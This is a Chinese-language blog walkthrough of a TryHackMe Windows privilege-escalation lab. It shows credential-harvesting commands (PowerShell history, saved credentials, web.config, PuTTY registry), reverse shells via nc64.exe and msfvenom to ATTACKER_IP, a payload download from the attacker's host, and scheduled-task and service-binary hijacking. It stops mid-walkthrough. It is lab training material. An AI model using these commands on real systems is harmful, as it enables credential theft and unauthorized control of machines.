<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows权限提升 | deCOLE's Blog</title><meta name="author" content="deCOLE"><meta name="copyright" content="deCOLE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Windows权限提升">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows权限提升">
<meta property="og:url" content="http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
<meta property="og:site_name" content="deCOLE&#39;s Blog">
<meta property="og:description" content="Windows权限提升">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/bnb.jpg">
<meta property="article:published_time" content="2025-03-17T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-18T05:59:46.394Z">
<meta property="article:author" content="deCOLE">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/bnb.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Windows权限提升",
  "url": "http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/",
  "image": "http://example.com/img/bnb.jpg",
  "datePublished": "2025-03-17T16:00:00.000Z",
  "dateModified": "2025-03-18T05:59:46.394Z",
  "author": [
    {
      "@type": "Person",
      "name": "deCOLE",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Windows权限提升',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">deCOLE's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows权限提升</span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Windows权限提升</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-17T16:00:00.000Z" title="发表于 2025-03-18 00:00:00">2025-03-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-18T05:59:46.394Z" title="更新于 2025-03-18 13:59:46">2025-03-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h1><h3 id="常见获取密码方式"><a href="#常见获取密码方式" class="headerlink" title="常见获取密码方式"></a>常见获取密码方式</h3><p><strong>无人值守的 Windows 安装</strong><br>在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">目录:\无人参与.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">系统信息文件夹:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure>

<p>作为这些文件的一部分，您可能会遇到凭证：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Credentials&gt;</span><br><span class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</span><br><span class="line">    &lt;Domain&gt;thm.local&lt;/Domain&gt;</span><br><span class="line">    &lt;Password&gt;MyPassword123&lt;/Password&gt;</span><br><span class="line">&lt;/Credentials&gt;</span><br></pre></td></tr></table></figure>



<p><strong>Powershell 历史</strong><br>每当用户使用 Powershell 运行命令时，它都会被存储到一个保存过去命令记忆的文件中。这对于快速重复以前使用过的命令非常有用。如果用户运行的命令直接在 Powershell 命令行中包含密码，则可以稍后使用cmd.exe提示符中的以下命令检索密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><em>注意：上述命令只能在 cmd.exe 中运行，因为 Powershell 不会将其识别%userprofile%为环境变量。要从 Powershell 读取文件，您必须将其替换%<strong>userprofile%<strong>为</strong>$Env:userprofile</strong></em>。 </p>
<p><strong>已保存的 Windows 凭据</strong><br>Windows 允许我们使用其他用户的凭据。此功能还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<p>虽然您看不到实际的密码，但如果您注意到任何值得尝试的凭据，则可以将它们与 runas 命令和 &#x2F;savecred 选项一起使用，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure>



<p><strong>IIS 配置</strong><br>Internet 信息服务 (IIS) 是 Windows 安装中的默认 Web 服务器。IIS 上的网站配置存储在名为的文件中web.config，可以存储数据库密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目录:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><br></pre></td></tr></table></figure>

<p>以下是在文件上快速查找数据库连接字符串的一种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure>



<p><strong>从软件中检索凭证：PuTTY</strong><br>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户无需每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供日后使用。虽然 PuTTY 不允许用户存储他们的SSH密码，但它会存储包含明文身份验证凭据的代理配置。</p>
<p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p>注意： Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p>
<p>就像 putty 存储凭证一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH客户端、VNC 软件等，都会有方法来恢复用户保存的任何密码。</p>
<p><strong>题目</strong></p>
<p><em><strong>问题一：</strong></em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181804022.png?raw=true" alt="image-20241218180419948"></p>
<p>在RDP上打开Powershell，输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<p>因为 Powershell 不会将其识别%userprofile%为环境变量。要从 Powershell 读取文件，必须将其替换%<strong>userprofile%<strong>为</strong>$Env:userprofile</strong>*。 </p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181809034.png?raw=true" alt="image-20241218180940996"></p>
<p><em><strong>问题二：</strong></em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181810985.png?raw=true" alt="image-20241218181056948"></p>
<p>我们按着给的路径直接找就行，到web.config</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181814341.png?raw=true" alt="image-20241218181453267"></p>
<p><em><strong>问题三：</strong></em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181816619.png?raw=true" alt="image-20241218181658582"></p>
<p>机翻有点难绷</p>
<p>其实就是用cmdkey找凭据，runas起shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list  #列出保存的凭据</span><br><span class="line">runas /savecred /user:mike.katz cmd.exe  #mike.katz是和列出的凭据相关的用户名</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181910381.png?raw=true" alt="image-20241218191021293"></p>
<p>然后找flag就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\mike.katz\Desktop</span><br><span class="line">dir</span><br><span class="line">type flag.txt</span><br></pre></td></tr></table></figure>





<p><em><strong>问题四：</strong></em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181911633.png?raw=true" alt="image-20241218191136591"></p>
<p>直接用命令就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181912251.png?raw=true" alt="image-20241218191230203"></p>
<h3 id="快速提权"><a href="#快速提权" class="headerlink" title="快速提权"></a>快速提权</h3><p><strong>计划任务</strong><br>查看目标系统上的计划任务，您可能会看到一个计划任务丢失了它的二进制文件或正在使用您可以修改的二进制文件。</p>
<p>可以使用不带任何选项的命令从命令行列出计划任务 schtasks 。要检索有关任何服务的详细信息，您可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /query /tn vulntask /fo list /v</span><br><span class="line">Folder: \</span><br><span class="line">HostName:                             THM-PC1</span><br><span class="line">TaskName:                             \vulntask</span><br><span class="line">Task To Run:                          C:\tasks\schtask.bat</span><br><span class="line">Run As User:                          taskusr1</span><br></pre></td></tr></table></figure>

<p>您将获得大量有关该任务的信息，但对我们来说重要的是“要运行的任务”参数，它指示计划任务执行的内容，以及“以用户身份运行”参数，它显示将用于执行该任务的用户。</p>
<p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的权限，我们使用icacls：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls c:\tasks\schtask.bat</span><br><span class="line">c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                    BUILTIN\Administrators:(I)(F)</span><br><span class="line">                    BUILTIN\Users:(I)(F)</span><br></pre></td></tr></table></figure>

<p>从结果中可以看出，BUILTIN\Users组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入任何我们想要的有效载荷。为方便起见，nc64.exe可以在 上找到C:\tools。让我们更改 bat 文件以生成反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p>然后我们在攻击者的机器上启动一个监听器，这个监听器和我们在反向 shell 上指示的端口相同：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>下次运行计划任务时，您应该会收到具有 taskusr1 权限的反向 shell。虽然您可能无法在实际情况下启动任务，而必须等待计划任务触发，但我们已为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行任务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; schtasks /run /tn vulntask</span><br></pre></td></tr></table></figure>

<p>你将按预期收到具有 taskusr1 权限的反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line">user@attackerpc$ nc -lvp 4444</span><br><span class="line">Listening on 0.0.0.0 4444</span><br><span class="line">Connection received on 10.10.175.90 50649</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">wprivesc1\taskusr1</span><br></pre></td></tr></table></figure>

<p>前往 taskusr1 桌面获取一个标志。不要忘记在本任务结束时输入该标志。</p>
<p><strong>始终安装高权限</strong><br>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些文件可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成以管理员权限运行的恶意 MSI 文件。</p>
<p>注意： AlwaysInstallElevated 方法不适用于该房间的机器，并且仅作为信息提供。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<p>为了能够利用此漏洞，必须同时设置这两个参数。否则，将无法利用此漏洞。如果设置了这两个参数，则可以使用 生成恶意 .msi 文件 msfvenom，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure>

<p>由于这是一个反向 shell，您还应该运行相应配置的Metasploit Handler 模块。传输完您创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br></pre></td></tr></table></figure>



<p><em><strong>问题一：</strong></em></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181918733.png?raw=true" alt="image-20241218191836673"></p>
<p>首先看计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181925071.png?raw=true" alt="image-20241218192514012"></p>
<p>然后是检查可执行文件的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls c:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181934369.png?raw=true" alt="image-20241218193424309"></p>
<p>看到我们的BUILTIN\Users组，对任务的二进制文件具有完全访问权限（F），这意味着我们可以修改bat文件，将其插入到我们要的Payload</p>
<p>用nc64.exe更改bat文件，生成反向shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p>然后开始监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>直接手动启动任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /tn vulntask</span><br></pre></td></tr></table></figure>

<p>连上后读flag就行</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412181944091.png?raw=true" alt="image-20241218194416022"></p>
<h3 id="滥用服务配置错误"><a href="#滥用服务配置错误" class="headerlink" title="滥用服务配置错误"></a>滥用服务配置错误</h3><p> <strong>Windows 服务</strong><br>Windows 服务由**服务控制管理器(SCM)**管理。SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态以及通常提供配置服务的方法的进程。</p>
<p>Windows 计算机上的每项服务都会有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件会实现特殊功能以便能够与 SCM 通信，因此并非任何可执行文件都可以作为服务成功启动。每项服务还指定了运行服务的用户帐户。</p>
<p>为了更好地理解服务的结构，让我们使用以下<code>sc qc</code>命令检查 apphostsvc 服务配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc apphostsvc</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: apphostsvc</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Application Host Helper Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : localSystem</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到，关联的可执行文件是通过<code>BINARY_PATH_NAME</code>参数指定的，而用于运行该服务的账户则显示在<code>SERVICE_START_NAME</code>参数上。</p>
<p>服务具有<strong>自主访问控制列表 (DACL)</strong>，它指示谁有权限启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他特权。 DACL 可以从 Process Hacker（位于您计算机的桌面上）中看到</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412191030997.png?raw=true" alt="image-20241219103031927"></p>
<p>所有服务配置都存储在注册表中：<code>HKLM\SYSTEM\CurrentControlSet\Services\</code></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412191509246.png?raw=true" alt="image-20241219150947157"></p>
<p>系统中每个服务都有一个子项。同样，我们可以在<strong>ImagePath</strong>值上看到关联的可执行文件，在<strong>ObjectName</strong>值上看到用于启动服务的帐户。如果为服务配置了DACL ，它将存储在名为Security 的子项中。正如您现在所猜到的，默认情况下只有管理员才能修改此类注册表项。</p>
<p><strong>服务关联的可执行文件的不安全权限</strong></p>
<p>如果与服务关联的可执行文件具有允许攻击者修改或替换它的弱权限，则攻击者可以轻松获得服务帐户的权限。 要了解它是如何工作的，让我们看一下在 <strong>Splinterware System Scheduler</strong>（splinterware公司的一个应用软件）上发现的漏洞。 首先，我们将使用<code>sc qc</code>查询相关服务配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc qc WindowsScheduler</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: windowsscheduler</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : System Scheduler Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcuser1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由上述查询结果可知：漏洞软件所安装的服务以svcuser1账户运行，与该服务关联的可执行文件路径为<code>C:\Progra~2\System~1\WService.exe</code>。 然后我们继续检查 服务关联的可执行文件的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)</span><br><span class="line">                                  NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                  BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                  BUILTIN\Users:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	由上述结果可知，Everyone组 对服务所关联的可执行文件具有修改权限 (M)，这意味着我们可以简单地用我们偏好的任何有效负载（payload）覆盖此文件，然后此服务将使用配置的用户帐户的权限执行payload。 我们可以在攻击机上使用 msfvenom 生成一个 exe-service 有效负载并通过 python 网络服务器传输该payload文件到目标机：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>然后，我们可以使用以下命令从目标机的Powershell界面接收来自攻击机的payload文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>在 Windows 服务器中，我们将用payload文件替换掉服务所关联的可执行文件。 由于我们需要另一个用户来执行我们的payload文件，因此我们还要向Everyone组 授予完全权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>我们在攻击者机上启动一个反向shell监听器：</p>
